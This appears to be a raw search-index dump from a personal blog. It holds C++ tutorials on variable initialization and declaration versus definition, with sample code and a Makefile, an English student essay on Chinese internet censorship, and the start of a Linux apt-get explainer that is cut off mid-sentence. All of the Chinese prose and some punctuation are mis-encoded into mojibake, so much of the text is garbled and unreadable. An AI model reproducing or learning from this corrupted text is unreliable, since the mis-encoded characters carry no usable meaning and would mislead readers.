a;è¡¨ç¤ºå£°æ˜äº†æ•´å‹aä½†æœªåˆå§‹åŒ–ï¼Œè€ŒC++ä¸­çš„å¯¹è±¡æ€»æ˜¯ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œæ— è®ºæ˜¯å¦å†™äº†åœ†æ‹¬å·æˆ–è€…æ˜¯å¦å†™äº†å‚æ•°åˆ—è¡¨ï¼Œä¾‹å¦‚ï¼š\nint basic_var; // æœªåˆå§‹åŒ–ï¼šåº”ç”¨\u0026quot;é»˜è®¤åˆå§‹åŒ–\u0026quot;æœºåˆ¶ CPerson person; // åˆå§‹åŒ–ï¼šä»¥ç©ºçš„å‚æ•°åˆ—è¡¨è°ƒç”¨æ„é€ å‡½æ•° å‚è€ƒé“¾æ¥ï¼š C++æ‰‹ç¨¿ï¼šå“ªäº›å˜é‡ä¼šè‡ªåŠ¨åˆå§‹åŒ–ï¼Ÿ\né»˜è®¤åˆå§‹åŒ–è§„åˆ™ å®šä¹‰åŸºæœ¬æ•°æ®ç±»å‹å˜é‡ï¼ˆå•ä¸ªå€¼ã€æ•°ç»„ï¼‰çš„åŒæ—¶å¯ä»¥æŒ‡å®šåˆå§‹å€¼ï¼Œå¦‚æœæœªæŒ‡å®šC++ä¼šå»æ‰§è¡Œé»˜è®¤åˆå§‹åŒ–(default-initialization)ã€‚ é‚£ä¹ˆä»€ä¹ˆæ˜¯â€é»˜è®¤åˆå§‹åŒ–â€å‘¢ï¼Ÿ\næ ˆä¸­çš„å˜é‡ï¼ˆå‡½æ•°ä½“ä¸­çš„è‡ªåŠ¨å˜é‡ï¼‰å’Œå †ä¸­çš„å˜é‡ï¼ˆåŠ¨æ€å†…å­˜ï¼‰ä¼šä¿æœ‰ä¸ç¡®å®šçš„å€¼ï¼› å…¨å±€å˜é‡å’Œé™æ€å˜é‡ï¼ˆåŒ…æ‹¬å±€éƒ¨é™æ€å˜é‡ï¼‰ä¼šåˆå§‹åŒ–ä¸ºé›¶(å®ƒä»¬å­˜å‚¨åœ¨è¿›ç¨‹çš„BSSæ®µï¼ˆè¿™æ˜¯å…¨é›¶çš„ä¸€æ®µå†…å­˜ç©ºé—´ï¼‰)ã€‚ C++11: If no initializer is specified for an object, the object is default-initialized; if no initialization is performed, an ? object with automatic or dynamic storage duration has indeterminate value. Note: Objects with static or thread storage duration are zero-initialized, see 3.6.2.\næ‰€ä»¥å‡½æ•°ä½“ä¸­çš„å˜é‡å®šä¹‰æ˜¯è¿™æ ·çš„è§„åˆ™ï¼š\nint i; // ä¸ç¡®å®šå€¼ int i = int(); // 0 int *p = new int; // ä¸ç¡®å®šå€¼ int *p = new int(); // 0 å‡ ç§åˆå§‹åŒ–æƒ…å†µå¯¹æ¯” å…¨å±€å˜é‡(å…¨å±€é™æ€å˜é‡) Vs å±€éƒ¨å˜é‡(å±€éƒ¨é™æ€å˜é‡) å…¨å±€å˜é‡ï¼Œå…¨å±€é™æ€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡æ˜¯å­˜æ”¾åœ¨BSSæ®µçš„ï¼Œæ‰€ä»¥é»˜è®¤åˆå§‹åŒ–ä¸º 0ã€‚å±€éƒ¨å˜é‡æ˜¯åœ¨æ ˆé‡Œé¢ï¼Œæ‰€ä»¥åˆå§‹åŒ–æƒ…å†µä¸ç¡®å®šã€‚\nç±»æˆå‘˜å˜é‡åˆå§‹åŒ– å¯è§å†…ç½®ç±»å‹çš„æˆå‘˜å˜é‡çš„â€é»˜è®¤åˆå§‹åŒ–â€è¡Œä¸ºå–å†³äºæ‰€åœ¨å¯¹è±¡çš„å­˜å‚¨ç±»å‹ï¼Œè€Œå­˜å‚¨ç±»å‹å¯¹åº”çš„é»˜è®¤åˆå§‹åŒ–è§„åˆ™æ˜¯ä¸å˜çš„ã€‚ æ‰€ä»¥ä¸ºäº†é¿å…ä¸ç¡®å®šçš„åˆå€¼ï¼Œé€šå¸¸ä¼šåœ¨æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–æ‰€æœ‰å†…ç½®ç±»å‹çš„æˆå‘˜ã€‚\nåµŒå¥—ç±»çš„å˜é‡åˆå§‹åŒ– è§„åˆ™è¿˜æ˜¯æ˜¯ä¸€æ ·çš„ï¼Œé»˜è®¤åˆå§‹åŒ–è¡Œä¸ºå–å†³äºå®ƒæ‰€å±å¯¹è±¡çš„å­˜å‚¨ç±»å‹ã€‚å°é—­ç±»ï¼ˆEnclosingï¼‰ä¸­æˆå‘˜å¯¹è±¡çš„å†…ç½®ç±»å‹æˆå‘˜å˜é‡çš„â€é»˜è®¤åˆå§‹åŒ–â€è¡Œä¸ºå–å†³äºå½“å‰å°é—­ç±»å¯¹è±¡çš„å­˜å‚¨ç±»å‹ï¼Œè€Œå­˜å‚¨ç±»å‹å¯¹åº”çš„é»˜è®¤åˆå§‹åŒ–è§„åˆ™ä»ç„¶æ˜¯ä¸å˜\nä»£ç ä¾‹å­ #include \u0026lt;iostream\u0026gt; //1. å…¨å±€å˜é‡ä¸é™æ€å…¨å±€å˜é‡ int g_var; int *g_pointer; static int g_static; class A{ public: int v; }; class B{ public: int v; A a; }; //2. å…¨å±€æˆå‘˜å˜é‡ A class_g_var; B class_b_g_var; int main(){ //1. å±€éƒ¨å˜é‡ä¸é™æ€å±€éƒ¨å˜é‡ int l_var; int *l_pointer; static int l_static; // 2. å…·å¤‡æˆå‘˜å˜é‡ A class_l_var; static A class_l_static; B class_b_l_var; std::cout\u0026lt;\u0026lt;\u0026quot;--------Global Vs Local Variate---------\u0026quot;\u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Global Variate: \u0026quot;\u0026lt;\u0026lt; g_var \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Global Point: \u0026quot;\u0026lt;\u0026lt; g_pointer \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Global Static Variate: \u0026quot;\u0026lt;\u0026lt; g_static \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Local Variate: \u0026quot;\u0026lt;\u0026lt; l_var \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Local Point: \u0026quot;\u0026lt;\u0026lt; l_pointer \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Local Static Variate: \u0026quot;\u0026lt;\u0026lt; l_static \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;--------Global Vs Local Class Variate---------\u0026quot;\u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Global Class Variate: \u0026quot;\u0026lt;\u0026lt; class_g_var.v \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Local Class Variate: \u0026quot;\u0026lt;\u0026lt; class_l_var.v \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Local Static Class variate: \u0026quot;\u0026lt;\u0026lt; class_l_static.v \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;--------2lGlobal Vs Local Class Variate---------\u0026quot;\u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Global Class Variate: \u0026quot;\u0026lt;\u0026lt; class_b_g_var.v \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; class_b_g_var.a.v \u0026lt;\u0026lt; std::endl; std::cout\u0026lt;\u0026lt;\u0026quot;Local Class Variate: \u0026quot;\u0026lt;\u0026lt; class_b_l_var.v \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; class_b_l_var.a.v \u0026lt;\u0026lt;std::endl; return 0; }; Makefile\nCXX = g++ # Warnings frequently signal eventual errors: CXXFLAGS=-g -std=c++11 -W -Wall -Weffc++ -Wextra -pedantic -O0 OBJS = \\ main.o EXEC = run %.o: %.cpp $(CXX) $(CXXFLAGS) -c $\u0026lt; -o $@ $(EXEC): $(OBJS) $(CXX) $(CXXFLAGS) -o $@ $(OBJS) $(LDFLAGS) main.o: main.cpp clean: rm -rf $(OBJS) rm -rf $(EXEC) ","date":1536631771,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536631771,"objectID":"23cfcab0cd058e15bfc068ee6cfea7d6","permalink":"http://www.guozet.me/post/C++-initialization-of-variable/","publishdate":"2018-09-11T02:09:31Z","relpermalink":"/post/C++-initialization-of-variable/","section":"post","summary":"ä»‹ç» åœ¨C++è¯­è¨€ä¸­int a;è¡¨ç¤ºå£°æ˜äº†æ•´å‹aä½†æœªåˆå§‹åŒ–ï¼Œè€ŒC","tags":"C++","title":"C++ å˜é‡çš„åˆå§‹åŒ–é—®é¢˜","type":"post"},{"authors":null,"categories":"C++","content":"Introduce å£°æ˜ å£°æ˜ä¸€ä¸ªå˜é‡åªæ˜¯å°†å˜é‡åæ ‡è¯†ç¬¦çš„æœ‰å…³ä¿¡æ¯å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œä½¿ç¼–è¯‘å™¨â€œè®¤è¯†â€è¯¥æ ‡è¯†ç¬¦ï¼Œä½†å£°æ˜ä¸ä¸€å®šå¼•èµ·å†…å­˜çš„åˆ†é…(æ²¡æœ‰å†…å­˜åˆ†é…)ã€‚å£°æ˜æœ‰ä¸¤ä¸ªä½œç”¨ï¼š\nå‘Šè¯‰ç¼–è¯‘å™¨ï¼Œè¿™ä¸ªåå­—å·²ç»åŒ¹é…åˆ°ä¸€å—å†…å­˜ä¸Šï¼Œä¸‹é¢çš„ä»£ç ç”¨åˆ°å˜é‡æˆ–è€…å¯¹è±¡æ˜¯åœ¨åˆ«çš„åœ°æ–¹å®šä¹‰çš„ã€‚å£°æ˜å¯ä»¥å‡ºç°å¤šæ¬¡ã€‚ å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œè¿™ä¸ªåå­—å·²ç»è¢«é¢„å®šäº†ï¼Œåˆ«çš„åœ°æ–¹å†ä¹Ÿä¸èƒ½ç”¨å®ƒæ¥ä½œä¸ºå˜é‡åæˆ–å¯¹è±¡åã€‚ class MyClass { //æ•°æ®æˆå‘˜ç»†èŠ‚... //æˆå‘˜å‡½æ•°ç»†èŠ‚... }; ä¸Šè¿°å£°æ˜ä»…å‘Šè¯‰ç¼–è¯‘å™¨æœ‰è‡ªå®šä¹‰ç±»å‹MyClass,ç¼–è¯‘å™¨ä»…å¯¹å…¶è¿›è¡Œè¯­æ±‡åˆ†æåŠåå­—çš„å†³è®®ï¼Œå¹¶æœªå ç”¨å†…å­˜!\nå®šä¹‰ å®šä¹‰å°±æ˜¯ï¼ˆç¼–è¯‘å™¨ï¼‰åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œä¸ºè¿™ä¸ªå¯¹è±¡åˆ†é…ä¸€å—å†…å­˜ï¼Œå¹¶ç»™å®ƒå–ä¸Šä¸€ä¸ªåå­—ï¼Œè¿™ä¸ªåå­—å°±æ˜¯å°±æ˜¯æˆ‘ä»¬ç»å¸¸æ‰€è¯´çš„å˜é‡åæˆ–å¯¹è±¡åã€‚\nåœ¨C++ç¨‹åºä¸­ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹å˜é‡å£°æ˜ä¹Ÿå°±æ˜¯å˜é‡å®šä¹‰ï¼Œå£°æ˜å˜é‡çš„åŒæ—¶ä¹Ÿå°±å®Œæˆäº†å˜é‡çš„å®šä¹‰ï¼Œåªæœ‰å£°æ˜å¤–éƒ¨å˜é‡æ—¶ä¾‹å¤–ã€‚\nå£°æ˜Vså®šä¹‰ï¼š æ˜¯å£°æ˜è¿˜æ˜¯å®šä¹‰ï¼Œåˆ¤æ–­çš„åŸåˆ™æ˜¯çœ‹æ˜¯å¦å ç”¨å†…å­˜\nclass MyClass //ç±»çš„å£°æ˜ï¼Œæ— å†…å­˜å æœ‰ { string myString; //stringçš„å£°æ˜ }; è¿™é‡Œé¢çš„string myString;å®åœ¨ç±»çš„å£°æ˜é‡Œé¢ï¼Œå¹¶æ²¡æœ‰å®é™…ç”³è¯·å†…å­˜ï¼Œæ‰€ä»¥è¿™å°±æ˜¯å£°æ˜ï¼Œå› ä¸ºå®ƒå¹¶æ²¡æœ‰å®é™…ç”³è¯·å†…å­˜ã€‚\n#include\u0026lt;iostream\u0026gt; //å…¨å±€ä½œç”¨åŸŸ string myString;//å®šä¹‰ï¼ŒmyStringæ˜¯å®ä¾‹åŒ–çš„stringï¼ int main() { //Mainå‡½æ•°ä½“å†… string myAnotherString;//å®šä¹‰ï¼ŒmyAnotherStringæ˜¯å®ä¾‹åŒ–çš„stringï¼ return 0; } è¿™é‡Œé¢çš„string myString;æ˜¯å…¨å±€å®šä¹‰ï¼Œå…¨å±€å¯¹è±¡ä¸€å¼€å§‹å°±æ˜¯è¦ç”³è¯·å†…å­˜çš„ã€‚\nå°ç»“ï¼šå˜é‡å’Œå¯¹è±¡ä¸åŠ externæ°¸è¿œæ˜¯å®šä¹‰,ç±»ä¸­çš„é™¤å¤–ã€‚ å‡½æ•°åªæœ‰å‡½æ•°å¤´æ˜¯å£°æ˜ï¼Œæœ‰å‡½æ•°ä½“çš„æ˜¯å®šä¹‰ã€‚ç±»æ°¸è¿œåªæ˜¯å£°æ˜ã€‚ç±»æˆå‘˜å‡½æ•°çš„å‡½æ•°ä½“æ˜¯å®šä¹‰ã€‚\nclass MyClass { static int x; //è¿™é‡Œçš„xæ˜¯å£°æ˜ static const int a; //è¿™é‡Œçš„aæ˜¯å£°æ˜ //éstaticå˜é‡åœ¨ç±»å®ä¾‹åŒ–æ—¶æ‰åˆ†é…å†…å­˜. MyClass();//è¿™é‡Œçš„å‡½æ•°æ˜¯å£°æ˜ }; int MyClass::x;//è¿™æ˜¯å®šä¹‰ const int MyClass::a=11;//è¿™æ˜¯å®šä¹‰ //è¿™é‡Œçš„Funæ˜¯å®šä¹‰ï¼Œå› ä¸ºæœ‰å‡½æ•°ä½“ int fun(int a,int b) { int c; c=a+b; return c; } //è¿™é‡Œçš„Funæ˜¯å£°æ˜ï¼Œå› ä¸ºè¿™é‡Œåªæœ‰å‡½æ•°å¤´ int fun(int a,int b)ï¼› ","date":1536631771,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536631771,"objectID":"e3d6fbb50f2e7d9c0d3b64e1f8296732","permalink":"http://www.guozet.me/post/c++-declaration-definition-initialization/","publishdate":"2018-09-11T02:09:31Z","relpermalink":"/post/c++-declaration-definition-initialization/","section":"post","summary":"Introduce å£°æ˜ å£°æ˜ä¸€ä¸ªå˜é‡åªæ˜¯å°†å˜é‡åæ ‡è¯†ç¬¦çš„æœ‰å…³ä¿¡æ¯å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œä½¿","tags":"C++","title":"C++å£°æ˜ä¸å®šä¹‰çš„åŒºåˆ«","type":"post"},{"authors":null,"categories":"Paper","content":"How Internet News Censorship in China Silences the Peopleâ€™s Song\nThis is a thesis when I studied in the ELS.\nIntroduce Last month, my friend Carrier went back to China from the United States after she had been living the United States for more than three years. She complained to me about the Internet in her house but not because of the speed of the Internet. She found that the Google Mail and Facebook were inaccessible when she wanted to access to Google Mail to receive some email from her boss and to contact friends through Facebook. As a computer engineer in China, I have never been puzzled by this since I can use a lot of ways to access to Google or Facebook. Is it challenging to access to Google and Facebook in China? Curiosity pushed me to investigate further. When I asked my parents and some high school classmates about whether they knew how to avert the government blocking access to Google, most of them said that they didnâ€™t know how to access to Google in China even though they knew the Google search engine is most famous in the world. After doing some research, I found that blocking Google is only one of many blocking events involving Internet news censorship in China.\nMore surprisingly, Google chose to enter the Chinese market in 2005, but Google suddenly announced that they decided to close the office in China in 2010. According to a new approach to China from the Google Official Blog, the officer said, â€œWe will be discussing with the Chinese government the basis on which we could operate an unfiltered search engine within the law, if at all. We recognize that this may well mean having to shut down Google.cn, and potentially our offices in China.â€ (2010). Through the history of the world, it is hard to find a company to break up with significant power in public. However, Google did it and closed their offices in China until 2018. The original reason for this matter is that Google received a lot of notifications from Chinese Government to block some websites and block some keywords involving Chinese politics. However, these blocking announcements didnâ€™t have any Chinese law to support them. Sometimes, the office just got a phone call to Google to require them to block some information. Are these demands from the Chinese government unreasonable in western culture? Is it difficult to understand why Google couldnâ€™t compromise with the Chinese government later? Most western experts believe that Chinese has a severe Internet news censorship to prevent the free spreading through their experience and history (Sorenson, 2013). Nevertheless, using Western values fails to explain why China has a rigorous Internet news censorship without a basic knowledge of Chinese culture and values.\nIn the section below, I begin to introduce four types of Internet news censorship. I then point out the reasons why the governments need to build the Internet news censorship system in China and why the citizens donâ€™t fight for their freedom on the Internet with the government. I then give the positive and negative about the Chinese censorship policy. Finally, I offer my opinion and conclude.\nTypes of Internet News Censorship Nowadays, the Internet news censorship is prevalent in China. How does the Internet censorship work in China? Firstly, we can take the blocking IP as an example. When someone wants to access to the website which is involved in the blocking list of government, the government censorship system will check it and doesnâ€™t respond to the user, and it will pass it to deal with next one (King, 2013). As a result, the user canâ€™t get the response from the server computer because the connection requirement was cut down by government censorship (King, 2013). Besides, the government built The National Firewall to curb the citizens accessing the news from foreign countries (King, 2013). For example, if you live or work in China, you canâ€™t use your computer or smartphone to access to the Youtube or Google websites directly. Also, the government cooperates with big internet and technology companies to ban some news. For example, the government cooperation with Baidu company which is the most significant search engine company in China to block some news which is terrible for some powerful politicians. However, the purpose of the censorship program just helps the government to delete some articles on the Internet. It canâ€™t persecute authors. There are some main types of Internet censorship in China.\nNon-transparent Censorship Ambiguous law It is so funny that China doesnâ€™t have a clear rule to describe how the Internet censorship system works in China. If you ask The Publicity Department of the Communist Party of China (CCPPD) why the government indicated the Google search must censor the results and remove some issues, they will tell you that Google should filter search results by Chinese laws. But when you ask them about which law these results violated, they just say that the content in these websites endanger the security of the nation, divulges state secrets and disturbs the social order (Sorenson, 2013). However, they canâ€™t precisely inform why Google must ban these sites. In fact, there is no a clear law that explains how the Internet News Censorship works (Sorenson, 2013). Besides, sometimes the censorship not only requires internet companies to delete some articles, but it also needs the companies to help the government to spread some government articles and change the search results to the government official website (Sorenson, 2013). Of course, this requirement is also by law even though you will not know this is what law forever. Enforce Internet Real-name system It also causes fear and narrows the freedom of speech on the Internet. Last year, China government revised the Network Information Management law. After that, each person who uses the Internet in China wanted to post some articles on Internet must correspond to his real name and Chinese identity card number. As the implementation of the Internet real-name system, government efficiently managed the peopleâ€™s opinion on the Internet. For example, if someone spread rumors or libelous statements, Chinese police easily find their real name and arrest them because the police can ask the internet company to get the private information of rumormongers. The National Firewall There are two critical walls in China which are famous in the world. One is Great Wall in the north of China to protect the Chinese citizens in the past. Another is Great Firewall on the internet to constrain the Chinese citizensâ€™ liberalizing. For instance, the government worker said, â€œThese companies which come from foreign countries are welcome to China, but these companies must follow the law. If you donâ€™t accept any Chinese law, then you canâ€™t be allowed to built officer in China.â€ The policy which doesnâ€™t allow each foreign companies spread these culture and opinion to Chinese society. It is not difficult to understand, but it bans the freedom in the china. These policies make Chinese people donâ€™t know how to judge the events which happened in China. Besides, these policies also cause some people donâ€™t have a chance to learn from the international company and their culture. So, this is a wall which let some Chinese people disable in the Mind. It is very dangerous for them. If they canâ€™t catch the library in the world, they canâ€™t catch up with some foreign countriesâ€™ people in the future.\nComplex Censorship System to Guide public opinion In China, Internet news censorship is complicated and methodical. This censorship system looks like an inspection machine. It is working as following steps.\nDo censorship by themselves. Chinese netizens have realized that a lot of words cannot send on the website, like Weibo, QQ. Because when you wrote some sensitive word or title and wanted to post them on a site, you would fail to send these words because the censorship system may notice you about â€œYour post has some sensitive words, so you can not post it.â€. Sometimes, even though you posted this article, but some worker of this website will delete it. However, this system doesnâ€™t tell you which words you need to change it. Therefore, Chinese netizens have learned replaced some sensitive words out of the similar words or deleted this part before they post the message. If you live in this situation for a long time, this censorship will make you built a behavior about checking your message before you want to pose it even though there is no censorship anymore. For example, a netizen would publish a message containing â€œHu Jintaoâ€, which was the last president of China. He may use some similar word to replace it because the president name in some websites is the sensitive words and you canâ€™t discuss them with some bad news on the site. Strict Internet News Censorship There is more than one billion Internet population in China (Xu, 2011). Even though a small part of netizens intentionally spread a rumor, it also has a significant influence on society safety and economy. For example, according to the news (December 2003), although there was no one person killed by atypical pneumonia (SARS) in the United States in 2003, panic with the rumor about SARS spread each side in the United States. In fact that no one to listened to the truth and the experts and they didnâ€™t believe everyone. They didnâ€™t go to the Chinese restaurant and close some Chinese markets because of these rumors. (LEE et al., 2003)If something like this happens in China, this will set off riots nationally even though only twenty percent of the people believe these tales. So, each country needs to build an Internet censorship system stop the rumor spread if they want to quell public panic.\nBusiness. If Google and Facebook were allowed to develop in China in the last ten years, Google and Facebook would have monopolized the search engine field and instant message field in China. Subsequently, Tencent (the same as Facebook) and Baidu (the same as Google) company would not rise. As a result, Chinese internet industry would be monopolized by Google and Facebook which are foreign companies that belong to the United States. So these companies can earn a lot of money from China and wouldnâ€™t give any space for any Chinese companies. It may damage local internet companies. Therefore, after the government built The National Firewall, it created a lot of opportunities for the Chinese company to improve their technique.\nCultural and social protection. If Facebook and Google had controlled the domestic cultural market in China, they would have exported their culture and values through China, and it may cause a terrible influence on traditional Chinese Culture. In social media field, it is easier to control the media and public opinion direction.\nNational security. Taking Huawei company as an example, Huawei has recently prepared how they can enter the United States market. However, the American government believes that their products will pose a threat to the United States because they suspect that this is a Chinese company which may be controlled by the Chinese government. As one of the largest company in the world, Google owns a sizeable amount of personal information data. When they occupy Chinese market, they may damage the Chinese information safety because this firm belongs to another country. From the government points of view, they canâ€™t believe these companies can be independent of their government.\nConclusions and Future Study When ostrich encounters their enemy in the desert, they would bury their head in the sand and think that the enemy can not see them.The Chinese government built an Internet wall like an ostrich shielding of the best-known websites, such as Google. Ironically, the Internet wall is useless to block libertarian news. Most Chinese people know that even the government blocks â€œthing,â€ someone also can read it in the foreign countries. Nowadays, the international information exchange is frequent. For example, there were 2.59 million Chinese people who traveled to the US during last year. They can easily read every new they liked. Also, some Chinese people often over the Internet wall to read foreign news. As they say, that â€œGood news never goes beyond the gate, while bad news spread far and wide.â€ The more blocking, the more attention.\nThe Chinese government is blocking some famous websites in the world just because they want to protect small, influential group and individual. Some expect who supports the Internet control policies in China, has often been cited a word, \u0026ldquo;I have no way to change you, but I have the right to choose our friends.\u0026rdquo; said by LuHui, the director of the state Internet information office. He is the manager of the Chinese Internet as most foreign media. He said, â€œwe are welcome any Internet company to enter the Chinese market, but you must observe two regulations: donâ€™t harmful on Chinaâ€™s national security and donâ€™t harmful on Chinese consumersâ€™ rights.â€ According to his opinion, the Chinese government shielding Google Google, Facebook, Twitter, YouTube, and thousands of websites such as Wikipedia Wikipedia, is to protect \u0026quot; the consumersâ€™ rights\u0026quot; and \u0026ldquo;national security\u0026rdquo; But the analysis of the above in this essay, we already know that it is not entirely correct. This censorship system only works for small group and individual interests to block world-famous sites to maintain a popular figure.\nIf this country always hides in the back of the internet walls by governments, it may be relatively safe. But they canâ€™t catch up with other advanced power in the world in the future. Besides, it also unable to obtain the respect of other nations or countries. \u0026ldquo;I have no way to change you, but I have the right to choose friends, \u0026quot; said by LuHui is good, but this sentence also applies to the Chinese people. They will have the right to choose which news they want to read.\nReferences A new approach to China. (2010, January 12). Retrieved from https://googleblog.blogspot.com/2010/01/new-approach-to-china.html\nIn U.S., Fear Is Spreading Faster Than SARS. (2003, April 16). Retrieved from http://www.nytimes.com/2003/04/17/world/the-sars-epidemic-asian-americans-in-us-fear-is-spreading-faster-than-sars.html\nKing, G., Pan, J., \u0026amp; Roberts, M. E. (2013, 05). How Censorship in China Allows Government Criticism but Silences Collective Expression. American Political Science Review, 107(02), 326-343. doi:10.1017/s0003055413000014\nQiu, J. L. (1999). Virtual censorship in China: Keeping the gate between the cyberspaces. International Journal of Communications Law and Policy, 4(1), 25.\nRevised U.S. Surveillance Case Definition for Severe Acute Respiratory Syndrome (SARS) and Update on SARS Cases, United States and Worldwide, December 2003. (n.d.). Retrieved from https://www.cdc.gov/mmwr/preview/mmwrhtml/mm5249a2.htm\nSorenson, A.(2013). Internet Censorship in China. Mankato, MN:Undergraduate Research Symposium.\nXu, X., Mao, Z. M., \u0026amp; Halderman, J. A. (2011). Internet Censorship in China: Where Does the Filtering Occur? Passive and Active Measurement Lecture Notes in Computer Science, 133-142. doi:10.1007/978-3-642-19260-9_14\n","date":1536545371,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536545371,"objectID":"e3bb4f0802e8627c1d3d2a29d9b4b01b","permalink":"http://www.guozet.me/post/How-Internet-News-Censorship-in-China-Silences-the-People-Song/","publishdate":"2018-09-10T02:09:31Z","relpermalink":"/post/How-Internet-News-Censorship-in-China-Silences-the-People-Song/","section":"post","summary":"How Internet News Censorship in China Silences the Peopleâ€™s Song\nThis is a thesis when I studied in the ELS.\nIntroduce Last month, my friend Carrier went back to China from the United States after she had been living the United States for more than three years. She complained to me about the Internet in her house but not because of the speed of the Internet. She found that the Google Mail and Facebook were inaccessible when she wanted to access to Google Mail to receive some email from her boss and to contact friends through Facebook. As a computer engineer in China, I have never been puzzled by this since I can use a lot of ways to access to Google or Facebook. Is it challenging to access to Google and Facebook in China? Curiosity pushed me to investigate further. When I asked my parents and some high school classmates about whether they knew how to avert the government blocking access to Google, most of them said that they didnâ€™t know how to access to Google in China even though they knew the Google search engine is most famous in the world. After doing some research, I found that blocking Google is only one of many blocking events involving Internet news censorship in China.\n","tags":"Paper","title":"How Internet News Censorship in China Silences the Peopleâ€™s Song","type":"post"},{"authors":null,"categories":"Linux","content":"Introduce å¸¸ç”¨çš„ä¸‰ä¸ªå‘½ä»¤ï¼š\nsudo apt-get update sudo apt-get upgrade sudo apt-get dist-upgrade apt-getæ˜¯æŸäº›linuxå‘è¡Œç‰ˆä½¿ç”¨çš„ä¸€ä¸ªâ€œåŒ…ç®¡ç†å™¨â€ï¼ˆè¿˜æœ‰åˆ«çš„å‘è¡Œç‰ˆä½¿ç”¨yumç­‰ï¼Œä»¥åŠbrewç­‰å…¶ä»–å¹³å°ä¸Šçš„åŒ…ç®¡ç†å™¨ï¼Œå·¥ä½œåŸç†ç±»ä¼¼ï¼‰ã€‚åŒ…ç®¡ç†å™¨çš„ä½œç”¨æ˜¯ä»æºï¼ˆSourceï¼‰æœåŠ¡å™¨é‚£é‡Œä¸‹è½½æœ€æ–°çš„è½¯ä»¶åŒ…åˆ—è¡¨ï¼Œç„¶ååœ¨ä½ éœ€è¦å®‰è£…æŸä¸ªè½¯ä»¶åŒ…ï¼ˆapt-get installï¼‰çš„æ—¶å€™ä»åˆ—è¡¨é‡Œé¢æŸ¥è¯¢è¿™ä¸ªè½¯ä»¶åŒ…çš„ç‰ˆæœ¬ä¿¡æ¯ã€ç³»ç»Ÿè¦æ±‚ã€ç¿»è¯‘ã€ä¾èµ–é¡¹ï¼ˆè¯¥è½¯ä»¶æ­£å¸¸è¿è¡Œå¿…é¡»å®‰è£…çš„å…¶å®ƒè½¯ä»¶ï¼‰å¹¶ä¸”æ·»åŠ åˆ°åŒæ—¶å®‰è£…çš„åˆ—è¡¨é‡Œé¢ï¼Œå†æŸ¥è¯¢æ‰€æœ‰å®‰è£…åˆ—è¡¨é‡Œé¢çš„è½¯ä»¶åŒ…çš„.debæ–‡ä»¶ä¸‹è½½åœ°å€ï¼Œæœ€åæ‰¹é‡ä¸‹è½½ï¼Œè‡ªåŠ¨åˆ†æå®‰è£…é¡ºåºç„¶åå®‰è£…å®Œæˆã€‚\nupdate \u0026amp; upgrade \u0026amp; dist-upgrade sudo apt-get updateå’Œsudo apt-get upgradeåˆ†åˆ«æ›´æ–°çš„æ˜¯ä»€ä¹ˆï¼š\nupdateæ˜¯ä¸‹è½½æºé‡Œé¢çš„metadataçš„. åŒ…æ‹¬è¿™ä¸ªæºæœ‰ä»€ä¹ˆåŒ…, æ¯ä¸ªåŒ…ä»€ä¹ˆç‰ˆæœ¬ä¹‹ç±»çš„ï¼Œæœ€æ–°ç‰ˆæœ¬æ˜¯ä»€ä¹ˆ. upgradeæ˜¯æ ¹æ®updateå‘½ä»¤ä¸‹è½½çš„metadataå†³å®šè¦æ›´æ–°ä»€ä¹ˆåŒ…(åŒæ—¶è·å–æ¯ä¸ªåŒ…çš„ä½ç½®)ï¼Œå¯¹å·²ç»å®‰è£…çš„è½¯ä»¶åŒ…æœ¬èº«è¿›è¡Œæ›´æ–°çš„è¿‡ç¨‹ã€‚ç”±äºç¡®å®šè¦æ›´æ–°çš„è½¯ä»¶åŒ…éœ€è¦å¯¹æœ¬åœ°å®‰è£…çš„ç‰ˆæœ¬å’Œåˆ—è¡¨çš„ç‰ˆæœ¬è¿›è¡Œæ¯”è¾ƒï¼Œæ‰€ä»¥è¦åœ¨updateä»¥åè¿è¡Œè¿™ä¸€æ¡. dist-upgrade:å¯ä»¥èªæ˜çš„è§£å†³ç›¸ä¾æ€§çš„é—®é¢˜,å¦‚æœæœ‰ç›¸ä¾æ€§é—®é¢˜,éœ€è¦å®‰è£…/ç§»é™¤æ–°çš„Package,å°±ä¼šè¯•ç€å»å®‰è£…/ç§»é™¤å®ƒ. (æ‰€ä»¥é€šå¸¸è¿™ä¸ªä¼šè¢«è®¤ä¸ºæ˜¯æœ‰ç‚¹é£é™©çš„å‡çº§) æ³¨æ˜ï¼šåœ¨installæ“ä½œä¹‹å‰æ‰§è¡Œupdateå’Œupgradeï¼Œå®é™…ä¸Šæ˜¯ç¡®ä¿æœ¬åœ°è½¯ä»¶åˆ—è¡¨ä¿¡æ¯å’Œå·²å®‰è£…è½¯ä»¶å‡ä¸ºæœ€æ–°çš„è¿‡ç¨‹ã€‚è¿™æ 